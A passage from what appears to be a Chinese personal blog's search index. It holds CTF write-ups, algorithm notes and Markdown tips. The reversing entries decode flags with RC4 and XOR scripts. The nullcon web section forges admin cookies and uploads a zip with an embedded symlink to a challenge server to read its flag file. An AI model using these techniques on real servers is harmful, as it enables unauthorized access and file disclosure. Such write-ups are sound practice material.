title=\"\" alt=\"\" width=\"509\">\n\nflag就是：c0ffee\n","tags":["ctf回顾"],"categories":["ctf"]},{"title":"攻防世界ctf-1000click/crypt/happyctf","url":"/2023/07/26/rev1/","content":"\n## 一、1000click\n\n这题ida完发现有一千多个函数，本来以为会很难，结果实际上很简单。\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726143159.png\" title=\"\" alt=\"\" width=\"424\">\n\n首先进入ida，我的思路是，这么多函数显然直接分析代码有点困难了。然后就shift+F12，找字符串，我第一感觉是先找flag，搜索一下，放弃了\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726143352.png\" alt=\"\" width=\"388\">\n\n然后打开程序\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726143431.png\" alt=\"\" width=\"401\">\n\n显然点击1000次也是不现实的，没准1000次之后也没有flag，但是发现，check之后会有提示，如下\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726143649.png\" title=\"\" alt=\"\" width=\"372\">\n\n他有一个error的报错信息，然后我就想着去ida里面搜一下，发现位置，点进去\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726143729.png\" alt=\"\" width=\"402\">\n\n发现对应函数，进入\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726143753.png\" title=\"\" alt=\"\" data-align=\"inline\">\n\n然后如下\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726143825.png\" alt=\"\" width=\"316\">\n\n发现判断函数，然后发现是判断与text比较，点进去text，发现一个flag，然后试了一下，发现对了，就结束了\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726143916.png)\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726143941.png\" title=\"\" alt=\"\" width=\"286\">\n\n#### 小结\n\n这题也算是给我一个新的经验了，对待程序类的题目，先根据程序里面的提示，去ida里面搜，直接看最后判断逻辑，没准就做出来了\n\n## 二、crypt\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726163858.png)\n\n这题，属实是折磨到我了。最开始我看就是对输入字符串进行一顿操作然后判断一下，这我熟悉啊，直接开始用python写脚本，后面发现越写越不对劲。先是拖进ida，找到main如下\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727130644.png\" alt=\"\" width=\"432\">\n\n很容易能发现sub140001120与sub140001140是关键函数，点进去发现如下\n\n<img title=\"\" src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727130810.png\" alt=\"\" width=\"436\">\n\n发现256这个数字，结合crypt这个标题，容易想到rc4这个算法，然后这个算法是对称加密算法（参考ctf-wiki）也就是有加密前或者加密后的字符串和key都可以解出对应的明文/密文\n\n发现是rc4加密算法之后就简单了，根据上面main函数的最后部分，先得到加密的密文，然后找一个rc4解密脚本，就结束了，下面是我在ctf-wiki上找到的脚本，还挺好用的\n\n```python\nimport base64\ndef rc4_main(key = \"init_key\", message = \"init_message\"):\n    print(\"RC4解密主函数调用成功\")\n    s_box = rc4_init_sbox(key)\n    crypt = rc4_excrypt(message, s_box)\n    return crypt\ndef rc4_init_sbox(key):\n    s_box = list(range(256))\n    print(\"原来的 s 盒：%s\" % s_box)\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    print(\"混乱后的 s 盒：%s\"% s_box)\n    return s_box\ndef rc4_excrypt(plain, box):\n    print(\"调用解密程序成功。\")\n    plain = base64.b64decode(plain.encode('utf-8'))\n    plain = bytes.decode(plain)\n    res = []\n    i = j = 0\n    for s in plain:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(ord(s) ^ k))\n    print(\"res用于解密字符串，解密后是：%res\" %res)\n    cipher = \"\".join(res)\n    print(\"解密后的字符串是：%s\" %cipher)\n    print(\"解密后的输出(没经过任何编码):\")\n    return cipher\na=[188, 197, 18, 125, 133, 35, 132, 113, 123, 57, 40, 2, 211, 81, 243, 44, 137, 43, 166, 44, 175, 9] #cipher\nkey=\"12345678abcdefghijklmnopqrspxyz\"\ns=\"\"\nfor i in a:\n    s+=chr(i)\ns=str(base64.b64encode(s.encode('\nutf-8')), 'utf-8')\nrc4_main(key, s)\n```\n\n运行完就是flag：flag{nice_to_meet_you}\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727140359.png)\n\n#### 小结\n\n这题主要的步骤应该是分析出是rc4加密算法，剩下的直接用脚本就行了\n\n## 三、happyctf\n\n这题做起来一点也不happy，刚下载附件的时候发现附带了一个pdb文件，对于从来没用过这个文件的我来说就直接战略性忽略了。但是后面才发现不带它直接分析是真滴折磨。完全不知道是干什么的。看了半天也不知道怎么做。最后加上了pdb，一下子就明朗了不少。至少知道了哪些函数是官方函数，是在干什么。\n\n下面是主要思路，点进main如下\n\n<img src=\"https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727161408.png\" title=\"\" alt=\"\" width=\"676\">\n\n先是判断长度，需要长度为24才可以继续判断\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727161505.png)\n\n这里很容易看明白，就是对输入逐字符进行操作，点进具体操作如下\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727161555.png)\n\n就是将每个字符都与0x14异或一下，并push_back到v里面，也就是存入v，然后返回main\n\n![](C:\\Users\\打工人\\AppData\\Roaming\\marktext\\images\\2023-07-27-16-17-05-image.png)\n\n上面是关键部分，先将字符串存入key，然后也是逐字符进行操作，但是操作对象是v，也就是上面异或之后的字符，进行判断，而这里如果操作函数返回0则会错误，所以要返回1，点进操作函数\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727161852.png)\n\n这里就是将key里面的字符与v9比较，不等则返回0，相等返回1. 而v9就是上面异或之后的字符\n\n**总结来说**，就是将我们的输入异或0x14之后，与key比较，不相等则错误。也就是将key逐字符异或0x14就得到了flag，脚本如下：\n\n```python\nx = list(\"rxusoCqxw{yqK`{KZqag{r`i\")\nflag = []\nfor i in range(0,24):\n    flag.append(chr(ord(x[i]) ^ 20))\nflag_ = ''.join(flag)\nprint(flag_)\n# flag如下 flag{Welcome_to_Neusoft}\n```\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230727162521.png)\n\n## 四、总结\n\n这上面三道题都对我来说有一定难度，但收获还是不小的。总结下来有下面几点：\n\n- gui类的题目，可以从中找到一些提示语句，然后直接去ida里面搜索对应语句，找到对应函数，直接进入核心判断逻辑语句\n\n- RC4的加解密题目，要关注256这个数字，如果有的话就要怀疑是不是RC4，是的话直接用已有的解密脚本做题\n\n- 如果附件带pdb一定要用，不然会很痛苦\n","tags":["ctf回顾"],"categories":["ctf"]},{"title":"攻防世界ctf - rev新手题","url":"/2023/07/20/1/","content":"\n> 最近实习中总有大把的时间闲着，我便趁着这段时间好好的做一做逆向的题目，希望可以提升一下自己吧。而且好像又重燃了对web的乐趣，所以我可能也会做一些web的题目。双修大法。\n\n## 一、Reversing-x64Elf-100\n\n很简单的逆向题，但这也算是好久以来第一个自己做出来的逆向题，需要好好记录一下。\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2023-07-20-12-50-49-image.png)\n\n下载附件后就一个文件，先拖进exeinfop查一下壳和位数，然后直接拖进ida。\n\n按照以往的经验找到main函数，直接静态分析即可，发现主要判断逻辑在sub_4006FD中\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230720153104.png)\n\n进入之后发现如下\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230720153154.png)\n\n分析还是比较好分析的，但是这题主要时间花在了python代码的一些细节上，下面是解题脚本\n\n```python\ntag = list(\"Dufhbmf\")\ntag1 = list(\"pG`imos\")\ntag2 = list(\"ewUglpt\")\nflag = []\n\nfor i in range(0, 12):\n    if i % 3 == 0:\n        flag.append(chr(ord(tag[2 * (i // 3)]) - 1))\n    elif i % 3 == 1:\n        flag.append(chr(ord(tag1[2 * (i // 3)]) - 1))\n    elif i % 3 == 2:\n        flag.append(chr(ord(tag2[2 * (i // 3)]) - 1))\n\nresult_string = ''.join(flag)\nprint(result_string)\n```\n\n最后输出 如下，**Code_Talkers**即为本题flag\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230720154222.png)\n\n#### 小结\n\n主要是python代码上面，char型不能直接减一，需要先用ord()函数转成Ascii，而且强制转换在python里面是函数int（），需要括起来。而且字符串想改成字符数组需要用list()函数，往数组里面加需要用append()函数，而且字符数组想以字符串输出，需要用join函数。\n\n## 二、666\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230720154417.png)\n\n这题与上面题类似，只需静态分析即可，还是先拖进exeinfop，发现是64位，拖进ida，进行分析，先找到main函数，如下\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230720163707.png)\n\n别看上来给了一个flag，按照以往经验，肯定不对xs，大致思路如下:\n\n先是存储输入到v5，然后进入主要函数encode进行处理，处理结果以地址形式放到s中，接下来是先判断输入的长度是否正确，然后与enflag比较，一样即证明输入正确。\n\n> 其中strcmp是比较字符串的函数，为0则证明两个字符串相等，因此!strcmp基本都是判断两个字符串是否相等\n\n接下来是encode函数，最开始我以为是个官方函数，结果google了半天发现不是，然后点进去如下\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230720163726.png)\n\n很容易就可以看懂，下面是解题脚本\n\n```python\ntag = list(\"izwhroz\\\"\\\"w\\\"v.K\\\".Ni\")\nflag = []\ni = 0\nwhile i < 18:\n    flag.append(chr((ord(tag[i]) ^ 18) - 6))\n    flag.append(chr((ord(tag[i+1]) ^ 18) + 6))\n    flag.append(chr(ord(tag[i+2]) ^ 18 ^ 6))\n    i += 3\nflag_ = ''.join(flag)\nprint(flag_)\n```\n\n> 没想到^运算解方程的时候也可以直接移到等号另一侧，记下来\n\n最后结果如下，其中unctf{b66_6b6_66b}就是flag了\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230720164258.png)\n\n#### 小结\n\n下面主要是这个题中学到的一些新技巧\n\n查看key的值（之前对于这个问题总是一知半解），在ida中点进key，如下\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230720163533.png)\n\n然后点击dd，摁H即可变为10进制，摁Q变为16进制\n\n还有就是enflag的导出，刚点进去的时候如下，看见一堆双引号的我是一脸懵逼的\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230720163853.png)\n\n然后发现一个方法，就是点击enflag，直接ctrl+x，就会出现如下，就可以直接粘贴出来了，也发现了双引号其实也是字符串的一部分。他甚至还用\\给你转义好了可以直接用，很棒\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230720164007.png)\n\n## 三、easyRE1   |   lucknum\n\n这两题有点过于简单了，都是直接拖进ida，就发现flag了（确实easy）\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230721094726.png)\n\n但是我卡了好久最后甚至看的题解才做出来。中间我甚至以为这串字符串是什么编码，试了半天也没做出来。最后原因竟是需要用flag{}括起来。不明觉厉，前面的第一题我最开始用flag括起来不对，然后直接输入就对了。但这题还必须括起来。。\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230721094744.png)\n\nflag如图，即为flag{db2f62a36a018bce28e46d976e3f9864}\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230721095310.png)\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230721095348.png)\n\nflag如图 flag{c0ngr@tul@ti0n_f0r_luck_numb3r}\n\n## 四、reverse_re3 迷宫题\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726102529.png)\n\n这题我分析了好久也没有思路，我最后做完总结一下，还是因为不会把迷宫从ida里面导出来或者直接看出来。最后无奈求助了题解，发现可以在ida里面直接看迷宫，又自己摸索了一下，最后做出来了。也算是对迷宫题有了一个初步的了解。\n\n这题的思路最开始我是一脸懵的，后来看了题解再看看才逐渐了解。你在玩一种很新的迷宫。（对我来说）\n\n首先进入main函数\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726103904.png)\n\n发现进入了sub_940()函数，点进去\n\n![](C:\\Users\\打工人\\AppData\\Roaming\\marktext\\images\\2023-07-26-10-39-43-image.png)\n\n看到wasd的时候就知道是迷宫了，然后发现函数sub_86c每次循环都会用到，点进去，如下，这时已经知道202020里面就是迷宫数组了，但是不知道如何有效的表示出来，具体表示方法一会再说。\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726104043.png)\n\n其中202AB0最开始为0，之后会自增，增到2便退出函数，如下\n\n而且结合上下两个图，发现迷宫应该是15*15的，而且有三个迷宫，由202AB0控制，只有当前面的输入循环完后v2仍为0才算通过了一个迷宫，需要通过三个迷宫才算成功。然后就可以返回上面看具体的wasd移动判断函数了。\n\n再看i j 在当前迷宫里面循环，当找到3的时候便停止，并且把i j分别存入行数和列数，便于之后判断。（后面看迷宫的时候也会发现每个迷宫只有一个3）\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726104218.png)\n\n点进判断“d”的函数，如下\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726104418.png)\n\n根据上面的分析，很容易看出202AB0为控制当前是哪个迷宫的，而且从前面得到的行列数开始判断，这个函数是判断d的，也就是右移，所以如果下一步是1则证明正确，就把下一步变成3，而所在的3变为1，这样就方便前面的函数下次找3的时候找到咱们移动后的位置开始判断，这样就实现了移动。并且如果下一步是4则返回1退出，也就是退出循环。即宏观来看：\n\n每个迷宫从3开始，途中必须每一步都要经过1，然后最终到达4证明当前迷宫通关。\n\n#### 小结\n\n然后下面是展示迷宫的操作：先点进去，迷宫最开始是下面这种情况，\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726105353.png)\n\n**然后只需要右键-array如下**\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726105641.png)\n\n然后如下设置，设置总数量，每行的数量，然后显示index，以及间距调为1，就\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/20230726105739.png)\n\n就会出现下面的样式\n\n![](https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2023-07-26-10-53-11-image.png)\n\n然后根据迷宫走，会走出下面的字符串，直接md5加密得到flag\n\nddsssddddsssdssdddddsssddddsssaassssdddsddssddwddssssssdddssssdddss\n\n即flag{aeea66fcac7fa80ed8f79f38ad5bb953}\n\n## 五、总结\n\n写完这篇文章我感觉我才算刚刚入门逆向。学会了编写一些简单的脚本解题，并且对一些ida的操作更加熟悉。也对迷宫题有了一些新的解题思路。\n\n希望之后能越来越好吧\n","tags":["ctf回顾"],"categories":["ctf"]},{"title":"nullcon HackIM CTF补题","url":"/2023/03/19/ctf/","content":"\n> 之前一直有各种事情没来得及补题，这周日终于闲了下来可以有时间补补题，这次的比赛虽然web就两道题但是很值得补一下的。而本菜鸟也只做出了最简单的第一题。害。现在正是Wolv ctf比赛的时候，看了看web题，嗯，好难。本菜鸟深知实力不够，干脆就趁这个时间把之前的题都补一补。\n\n# 一.cookie伪造\n\n这题应该是非常简单的一道题，下载源码后可以在代码中找到如下语句\n\n```python\n@app.route('/whoami')\ndef whoami():\n    role = request.cookies.get('role','guest')\n    really = request.cookies.get('really', 'no')\n    if role == 'admin':\n        if really == 'yes':\n            resp = 'Admin: ' + os.environ['FLAG']\n        else:\n            resp = 'Guest: Nope'\n    else:\n        resp = 'Guest: Nope'\n    return Response(resp, mimetype='text/plain')\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port='8080', debug=False)\n```\n\n可以很清晰的看到上面两个if语句都通过后就可以打印出flag，因此借助burp语句可以很快速的实现。如下图\n\n![](https://s3.bmp.ovh/imgs/2023/03/19/d67e3cc48487afd1.png)\n\n先是用burp抓包，然后构造一下cookie使其可以通过if，点击action将其发送到repeater，然后点击send便可以发送我们构造好了的cookie，之后便可以接收到flag了！如下\n\n![](https://s3.bmp.ovh/imgs/2023/03/19/febe47596ef06c7f.png)\n\n# 二、上传文件\n\n这题的题解主要参照[这个网址](https://www.cnblogs.com/xxpanda/p/17212918.html)\n\n但是很奇怪，我参照这个网址的方法下来出现了没有找到文件的标志\n\n![](https://s3.bmp.ovh/imgs/2023/03/19/5333aefb90522225.png)\n\n于是我又去找了另一个官方的[题解网址](https://ctftime.org/writeup/36347)，根据他的做法下来，也是一样的标志，这样只能说明flag文件已经被官方删除了？？具体原因我也不太清楚。但是方法肯定是这样的，如下\n\n```python\n@app.route('/', methods=['GET'])\ndef index():\n    output = io.StringIO()\n    output.write(\"Send me your zipfile as a POST request and I'll make them accessible to you ;-0.\")\n\n    return Response(output.getvalue(), mimetype='text/plain')\n\n\n@app.route('/', methods=['POST'])\ndef upload():\n    output = io.StringIO()\n    if 'file' not in request.files:\n        output.write(\"No file provided!\\n\")\n        return Response(output.getvalue(), mimetype='text/plain')\n\n    try:\n        file = request.files['file']\n\n        filename = hashlib.md5(secrets.token_hex(8).encode()).hexdigest()\n        dirname = hashlib.md5(filename.encode()).hexdigest()\n\n        dpath = os.path.join(\"/tmp/data\", dirname)\n        fpath = os.path.join(dpath, filename + \".zip\")\n\n        os.mkdir(dpath)\n        file.save(fpath)\n\n\n        with zipfile.ZipFile(fpath) as zipf:\n            files = zipf.infolist()\n            if len(files) > 5:\n                raise Exception(\"Too many files!\")\n\n            total_size = 0\n            for the_file in files:\n                if the_file.file_size > 50:\n                    raise Exception(\"File too big.\")\n\n                total_size += the_file.file_size\n\n            if total_size > 250:\n                raise Exception(\"Files too big in total\")\n\n        check_output(['unzip', '-q', fpath, '-d', dpath])\n\n\n        g = glob.glob(dpath + \"/*\")\n        for f in g:\n            output.write(\"Found a file: \" + f + \"\\n\")\n\n        output.write(\"Find your files at http://...:8088/\" + dirname + \"/\\n\")\n\n\n    except Exception as e:\n        output.write(\"Error :-/\\n\")\n\n    return Response(output.getvalue(), mimetype='text/plain')\n\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port='8080', debug=True)\n```\n\n先看代码，看见是让我们上传一个zip文件，当时就卡在了上传文件好像没什么用这里了，看了题解是要用软链接，不能直接上传，如下图：\n\n![](https://s3.bmp.ovh/imgs/2023/03/19/a55761c784ae3d80.png)\n\n先输入ln -s 将文件变为软链接格式，然后打包压缩，最后按照下面的代码上传文件\n\n```python\nimport requests\nurl = \"http://52.59.124.14:10015/\"\nfiles = {'file':open('test.zip','rb')}\nres = requests.post(url,files=files)\n\nprint(res.text)\n```\n\n最后回复如下\n\n![](https://s3.bmp.ovh/imgs/2023/03/19/c74d84a09b6ce064.png)\n\n然后在10016端口打开这个网址就会出现下面的网页\n\n![](https://s3.bmp.ovh/imgs/2023/03/19/89c09bd6962d99bd.png)\n\n正常来说应该是点击这个flag@就会出现flag，但是并没有出现，但是方法肯定就是这样的了。\n\n接下来就是有时间补补lactf的题，感觉那个题都还不错，值得补一下，剩下的就是等这个ctf结束看题解了。。。\n","tags":["ctf补题"],"categories":["ctf"]},{"title":"三种基础算法学习","url":"/2023/01/16/gui/","content":"\n# <center>一、归并排序</center>\n\n### 1、算法思想\n\n其实这些排序算法都是很基础的东西，要是有考试的话直接sort就够用，但是目的还是学习思想，有些题用这些算法里面的思想可能会有奇效。\n\n###### （一）归并排序思想：\n\n1. 先确定分界点，就是区间中点`mid = (l+r) / 2`\n\n2. 先两侧递归，即先递归左面排序，后递归右面排序\n\n3. 将上面两个排好序的序列合二为一，用到的是双指针算法\n\n###### （二）双指针算法\n\n简单来说就是两个指针分别指向两个有序数列（默认从小到大）的开头，比较两个指针指向的数字，这两个数中较小的数一定是两个序列的最小的数，填入新数组的开头，然后较小的数的指针加一，以此类推\n\n###### （三）稳定性\n\n归并排序是稳定的。稳定的含义简单来说就是在未排序之前两个数的相对位置和排序之后两个数的相对位置一致。就比如排序前a在b左边但是a=b，排序后a仍在b左边，不会在b右边，这就是稳定性。\n\n一般用于对某个对象的属性进行排序的时候，这个对象有多个属性时，比如价格，性价比两项，先对价格进行排序，排好之后再对性价比进行排序，但是要求对相同性价比的商品价格低的优先级仍高于价格高的优先级（即已有a=b，此时ab指代性价比，需要仍保持ab之前的排序不变，即价格的高低顺序一致），而不会反过来，这时候的排序算法就需要有稳定性的排序算法。而不稳定的排序算法（如快排）就会有可能使当a=b的时候ab的相对顺序和之前不一致。\n\n### 2、代码示例（模板来咯）\n\n```cpp\nint tmp[N];\nvoid merge_sort(int q[],int l, int r){\n    if(l >= r) return;\n    int mid = l+r >> 1;\n    merge_sort(q,l,mid);\n    merge_sort(q,mid+1,r);\n    int k = 0,i = l, j = mid+1;\n    while(i <= mid && j <= r)\n        if(q[i] < q[j]) tmp[k++] = q[i++];\n        else tmp[k++] = q[j++];\n    while(i <= mid) tmp[k++] = q[i++]\n    while(j <= r) tmp[k++] = q[j++];\n    for(i = l, j = 0; i <= r; i++,j++) q[i] = tmp[j];\n}\n```\n\n其实这种基础算法归根结底学的是思想，思想应该更加重要。\n\n# <center>二、快速排序</center>\n\n### 1、基本思想\n\n快速排序的基本思想十分简单，如下图，其中**调整位置并且递归**是主体部分，下面我将放出朴素快速排序和最近学到的一种很新的快速排序代码方式，**~~正所谓背模板嘛~~**。仅供参考。\n\n![](https://s3.bmp.ovh/imgs/2023/01/16/b0254238f986d7b8.jpg)\n\n（字丑请见谅）\n\n**注意** ：x位置也可以是随机的，不一定在中点或者左右端点。\n\n### 2、代码如下：\n\n###### （一）朴素快速排序算法：\n\n本来想敲一遍的，但是发现朴素算法不够优雅肯定用不到，所以就讲一下基本思路就好了\n\n1. 建立两个数组a[N]与b[N]；\n\n2. 对q[x]进行扫描，大于等于x的放到a里面，小于x的放到b里面\n\n3. 最后把a里面的数放到q前面，然后紧接着把b里面的数放到q里面完成。\n\n4. 然后分别对左右两边递归。结束\n\n这种算法的时间复杂度不大，仍是O(n)（指一次递归过程中，不是总的时间复杂度），但是用到了额外的空间，空间复杂度较高。下面这种“优雅”的方法可以有效避免这一点。\n\n###### （二）优雅的快排算法\n\n基本思路，用到两个指针i，j；\n\n1. i 指针负责判断指向的数是否小于x，如果符合条件，则自增，如果指向的数 \\leq x，停止移动\n\n2. j 指针负责判断指向的数是否小于x，如果符合条件，则自增，如果指向的数 \\geq x，停止移动\n\n3. 如果i指针和j指针同时停止移动，则交换两指针指向的内容，保证了i指针所指向的数之前全部小于x，j指针指向的数之后均大于x；\n\n4. 当i指针\\geq j指针后，停止循环\n\n5. 然后以l到j，j+1到r为分界分别递归\n\n代码如下\n\n```cpp\nvoid quick_sort(int q[],int l,int r){\n    if(l >= r) return;\n    int i = l-1, j = r+1;\n    int x = q[(l+r)/2];\n    while(i < j){\n       do i++; while(q[i] < x);\n       do j--; while(q[j] > x);\n       if(i < j) swap(q[i],q[j]);\n    }\n    quick_sort(q,l,j);\n    quick_sort(q,j+1,r);\n}\n```\n\n这种方法就有效避免了额外再开辟空间的情况，空间复杂度较好。\n\n# <center>三、二分法</center>\n\n### 1、算法思路\n\n二分查找主要分为两类，一类是整数二分查找，一类是实数二分查找。整数二分查找比较困难，因为边界问题很多，需要考虑的事情很多，下面说一下二分查找的基本思路。\n\n**注：有单调性的一定可以用二分，没有单调性的不一定不能用二分，二分的本质并不是单调性，关系并不是很大**\n\n![](https://s3.bmp.ovh/imgs/2023/01/20/92a8b513b04c4e3b.png)\n\n如上图，整数二分的本质并不在单调性，只不过大部分例子都是单调性有关而已。而实际的本质是把一个区间按**某个性质分为两段**，**（由于是整数二分则上面两段的箭头指向的端点并不重合）**，通过二分就可以分别找出两个箭头所指向的位置。而正由于有两个区间的端点，因此有两个模板分别求这两个箭头指向的位置。简单来说：\n\n- 左侧箭头指向的是符合红色条件的最右侧的位置\n\n- 右侧箭头指向的是符合绿色条件的最左侧的位置\n\n为方便理解，可以以一道经典例题为例：\n\n> 给定一个按照升序排列的长度为 n的整数数组，返回一个元素 k的起始位置和终止位置（位置从 0开始计数）如果数组中不存在该元素，则返回 -1 -1。\n\n即如果序列为1,2,3,3,3,4,5,5，需要返回3的起始位置和终止位置，则用二分较快。其中起始位置的3就代表上图右侧箭头，指向的是符合绿色条件的最左侧的位置，即此处的3把整个区间按性质：是否大于等于3分成两半。左侧均小于三，右侧均大于等于3；终止位置3就代表上图左侧箭头，指向的是符合红色条件的最右侧位置，即此处的3把整个区间按性质：是否小于等于3分成两半。左侧均小于等于三，右侧均大于3\n\n因此，像这种找区间左右端点的题就需要分别使用两种模板，如下：\n\n### 2、代码模板\n\n###### (一)、整数模板\n\n```cpp\n// 模板一\nwhile(l < r){\n    int mid = l + r >> 1;\n    if(check(mid)) r = mid;\n    else l = mid + 1;\n}\n//模板二 if后面跟l就加一\nwhile(l < r){\n    int mid = l+ r + 1 >> 1;   // +1是为了防止死循环\n    if(check(mid)) l = mid;\n    else r = mid - 1;\n}\n```\n\n**注意：L = mid 时，初始化mid的时候需要+1，是为了防止死循环**\n","tags":["算法基础"],"categories":["算法学习"]},{"title":"第0篇文章","url":"/2023/01/14/hello-world/","content":"\n# 欢迎来到我的博客！\n\n俗话说授人以鱼不如授人以渔，本博客主要基于这位大佬的[博客文章](http://blog.haoji.me/build-blog-website-by-hexo-github.html)（网址好像寄了）为教程进行建设的。后续讨论区功能也将加入，希望到时候可以一起来玩♂耍与交流。\n\n（2023.1.16更新）本博客由于之前一段时间比较忙处于完全废弃的状态，如今从新拾起博客，并且换了一个更加美观的主题。今后的博客应该会主要记录一下学习ctf过程中的知识点总结和一些算法的学习总结。（2023.7.12更新）博客再次重整，删去了很多没必要的文章，内容再次精简，希望这是一个新的开始。\n此博客的所有源码均可以在我的[github仓库](https://github.com/thenights1/thenights1.github.io)中找到，各位大佬也可以去github和我一起交流。\n\n如有错误欢迎各位大佬前来指正。\n","tags":["引言"]},{"title":"Markdown基础语法总结","url":"/2022/09/29/Markdown/","content":"\n# 占楼，未来的Markdown的一些语法学习我将会在这里实时更新，如果内容过多我会另设文章\n\n## 就当是一个监督学习的文章占楼！\n\nMarkdown是一种轻量级标记语言，排版语法简洁，让人们更多地关注内容本身而非排版。它使用易读易写的纯文本格式编写文档，可与HTML混编，可导出 HTML、PDF 以及本身的 .md 格式的文件。因简洁、高效、易读、易写，Markdown被大量使用，如Github、Wikipedia、简书等。（搜索引擎得来）   \nMarkdown的语法十分简单，常用的标记符号不超过十个，用于日常写作记录绰绰有余，不到半小时就能完全掌握。\n\n### 1.[标题语法](#1)\n\n### 2.[插入代码语法](#2)\n\n### 3.[跳转目录语法](#3)\n\n### 4.[插入图片语法](#4)\n\n### 5.[删除线问题](#5)\n\n<p id=\"1\"></p>\n\n## 1.Markdown标题语法\n\n要创建标题，在单词或短语前面添加井号 (#):由一到六，#越多标题文字显示越小\n\n如下所示\n\n```\n# head1\n## head2\n### head3\n#### head4\n##### head5\n###### head6\n```\n\n效果如下（注意#后面要加空格）\n\n# head1\n\n## head2\n\n### head3\n\n#### head4\n\n##### head5\n\n###### head6\n\n<p id=\"2\"></p>\n\n## 2.Markdown代码语法\n\n（突然想到也没必要按顺序写笔记，应该是学了什么写什么，嘿嘿，好久没更新了，来浅浅更新一下）\n\nMarkdown支持直接用行缩进四个空格或者一个制表符来创建一个代码块,但是这种要注意代码块要和上一段留出一行来，不然就会无法显示代码块\n\n    int i=;\n    int j=0;\n\n就像上面这种，但是这样我感觉，很不方便，所以我更倾向于下面这种，在代码块的上下分别用用三个~或者三个```将其包起来，这样还能显示代码行数，我更倾向于这种\n\n```\n~~~\nint i=0;\nint j=0;\n~~~\n```\n\n<p id=\"3\"></p>\n\n## 3.Markdown跳转目录语法\n\n这个我测试了半天，简单如下\n\n```\n[标题名](#标题链接)\n```\n\n正常来说标题链接就是小标题的名字，但是我发现我用了之后只能在vscode编写的时候可以跳转，而在网页中无效，我也不知道什么原因，搜索之后也不知道，所以我才用了另一种方法，就是在标题的上方加上这句\n\n```\n[相应标题](#锚点)\n\n<p id= \"锚点\"></p>  //这里的锚点最好用数字1234，很好用\n```\n\n这样就可以跳转啦\n\n<p id=\"4\"></p>\n\n## 4.Markdown插入图片语法\n\n图片相关的代码很简单，常用的就两种（准确的说是我常用），第一种就是简单地插入图片或gif，代码如下\n\n```\n![简单描述，不会显示](图片地址 \"图片描述，当鼠标悬停会显示\")\n\n示例代码：\n\n![简单描述，不会显示](https://upload-bbs.mihoyo.com/format,gif \"图片描述，当鼠标悬停会显示\")\n```\n\n示例如下\n![图片](https://upload-bbs.mihoyo.com/upload/2022/10/04/286746010/cfec48f4dc28a69315f9986dae9d5561_7495227528267660980.gif?x-oss-process=image/auto-orient,0/interlace,1/format,gif \"可爱的小东西\" )\n\n而如果想插入链接，就是点击图片跳转，需要再用一个方括号将原有Markdown图片语法括起来，然后在旁边加上需要链接的网址，如下代码\n\n```\n[![简单描述，不会显示](图片地址 